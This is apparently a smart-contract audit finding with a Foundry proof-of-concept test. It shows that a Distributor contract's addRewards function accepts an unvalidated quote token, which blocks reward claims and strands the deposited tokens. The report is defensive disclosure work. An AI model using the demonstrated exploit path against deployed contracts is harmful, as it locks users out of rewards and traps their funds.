  "body": "## Finding Description\nThe addRewards function accepts two arbitrary token addresses and attempts to infer which one is the pool’s base (launch) asset by checking whether a rewards pool exists for token0; if not, it swaps the order and uses token1 as base. While this correctly detects the base asset, the function does not validate that the other token (the “quote” asset) actually matches the configured quote asset of the pool (rs.quoteAsset). It proceeds to:\n- add pending quote rewards,\n- increase totalPendingRewards for the user-supplied quote token address,\n- and transfer that arbitrary quote token to the contract.\n\nLater, when users claim, the distributor uses rs.quoteAsset (the pool’s configured quote token) to distribute quote rewards and to decrement totalPendingRewards for rs.quoteAsset. If the added quote rewards were funded with a different token address than rs.quoteAsset, the claim path attempts to decrement totalPendingRewards[rs.quoteAsset] which was never increased, causing ClaimAmountExceedsTotalPendingRewards and blocking claims. The mis-deposited token remains stuck in the contract.\n\nHighest-impact scenario:\n- Pool base = LToken, pool quote = USDC.\n- A caller funds quote rewards using DAI via addRewards(LToken, DAI, 0, amount).\n- The function accepts DAI, increases totalPendingRewards[DAI], and transfers DAI in.\n- Any subsequent claim attempts to transfer USDC and decrement totalPendingRewards[USDC], which was not increased, triggering a revert and leaving the DAI stranded.\n\n## Root cause:\nIn contracts/launchpad/Distributor.sol#L106-L131 the function accepts a user-supplied “quoteAsset” without enforcing that it equals the configured rs.quoteAsset for the base asset’s rewards pool. It then accounts pending rewards and transfers for the arbitrary quoteAsset instead of the canonical rs.quoteAsset, creating a mismatch between deposits and distribution accounting.\n\n[https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L106-L118](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L106-L118)\n```solidity\nfunction addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {\n    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =\n        (token0, token1, amount0, amount1);\n    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);\n\n    if (rs.quoteAsset == address(0)) {\n        rs = RewardsTrackerStorage.getRewardPool(token1);\n\n        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();\n\n        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);\n    }\n\n    if (rs.totalShares == 0) revert NoSharesToIncentivize();``\n\n```\n\n[https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L127-L131](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L127-L131)\n```solidity\n    if (quoteAssetAmount > 0) {\n        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);     // <──── uses un-validated quoteAsset\n        _increaseTotalPending(quoteAsset, quoteAssetAmount);               // <──── books it under wrong key\n        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));\n    }\n}\n```\n## Recommendation\nEnforce that the user-supplied quote asset matches the pool’s configured quote asset, or ignore the user input entirely and derive the quote asset from rs.quoteAsset once the base asset is determined. Also consider reverting if token0 == token1 to avoid nonsensical pairs.",
  "proof_of_concept": "## poc \nadd file \n```c\nforge test --match-test test_PoC_MismatchedQuoteBlocksClaimsAndStrandsFunds -vvv \n```\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.27;\n\nimport \"forge-std/Test.sol\";\nimport {Distributor} from \"contracts/launchpad/Distributor.sol\";\nimport \"contracts/launchpad/libraries/RewardsTracker.sol\";\n\nimport {MockERC20} from \"forge-std/mocks/MockERC20.sol\";\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\n\n/// @title PoC for mismatched quote asset in Distributor.addRewards causing claim DOS and fund stranding\ncontract DistributorQuoteMismatchPoC is Test {\n    using SafeTransferLib for address;\n\n    Distributor d;\n\n    address launchpad;\n    address baseToken; // e.g., LToken\n    address usdc;      // canonical quote\n    address dai;       // mismatched quote\n\n    address user;\n\n    function setUp() public {\n        // Setup launchpad and distributor\n        launchpad = vm.addr(uint256(keccak256(abi.encode(\"launchpad\"))));\n        d = new Distributor();\n        d.initialize(launchpad);\n\n        // Deploy mock tokens\n        baseToken = address(new MockERC20());\n        MockERC20(baseToken).initialize(\"LToken\", \"LTN\", 18);\n        usdc = address(new MockERC20());\n        MockERC20(usdc).initialize(\"USDC\", \"USDC\", 6);\n        dai = address(new MockERC20());\n        MockERC20(dai).initialize(\"DAI\", \"DAI\", 18);\n\n        // Mint balances to this test contract for adding rewards\n        deal(baseToken, address(this), 1_000 ether);\n        deal(usdc, address(this), 1_000_000 * 1e6);\n        deal(dai, address(this), 1_000 ether);\n\n        // Create rewards pair: baseToken against canonical quote (USDC)\n        vm.prank(launchpad);\n        d.createRewardsPair(baseToken, usdc);\n\n        // Create a staker so totalShares > 0\n        user = vm.addr(uint256(keccak256(abi.encode(\"user\"))));\n        vm.prank(launchpad);\n        d.increaseStake(baseToken, user, 1);\n\n        // Approvals for adding rewards\n        dai.safeApprove(address(d), type(uint256).max);\n        usdc.safeApprove(address(d), type(uint256).max);\n        baseToken.safeApprove(address(d), type(uint256).max);\n    }\n\n    /// @notice Demonstrates that adding quote rewards with a mismatched token (DAI) blocks claims and strands funds\n    function test_PoC_MismatchedQuoteBlocksClaimsAndStrandsFunds() public {\n        uint128 quoteReward = uint128(50 ether);\n\n        // Add quote rewards using mismatched token: pass (baseToken, dai, 0, quoteReward)\n        // This will:\n        // - Increase pendingQuoteRewards in the pool\n        // - Increase totalPendingRewards keyed under DAI\n        // - Transfer DAI into Distributor\n        d.addRewards(baseToken, dai, 0, quoteReward);\n\n        // Sanity: pending quote rewards accrued for staker\n        (uint256 pendingBase, uint256 pendingQuote) = d.getPendingRewards(baseToken, user);\n        assertEq(pendingBase, 0, \"No base pending expected\");\n        assertEq(pendingQuote, quoteReward, \"Pending quote should equal the added mismatched amount\");\n\n        // Balances: Distributor holds DAI, not USDC\n        assertEq(MockERC20(dai).balanceOf(address(d)), uint256(quoteReward), \"Distributor should hold DAI\");\n        assertEq(MockERC20(usdc).balanceOf(address(d)), 0, \"Distributor should hold 0 USDC\");\n\n        // Accounting: totalPendingRewards keyed under DAI, not USDC\n        assertEq(d.totalPendingRewards(dai), uint256(quoteReward), \"totalPending for DAI should reflect reward\");\n        assertEq(d.totalPendingRewards(usdc), 0, \"totalPending for USDC should be zero\");\n\n        // Attempt to claim: Distributor will try to decrement USDC pending and transfer USDC\n        // This reverts with ClaimAmountExceedsTotalPendingRewards due to mismatch\n        vm.prank(user);\n        vm.expectRevert(abi.encodeWithSelector(Distributor.ClaimAmountExceedsTotalPendingRewards.selector));\n        d.claimRewards(baseToken);\n\n        // Funds are stranded: owner cannot skim DAI because totalPendingRewards[DAI] covers full balance\n        vm.expectRevert(abi.encodeWithSelector(Distributor.SkimOverflow.selector));\n        d.skimExcessRewards(dai, 1);\n    }\n}\n```",
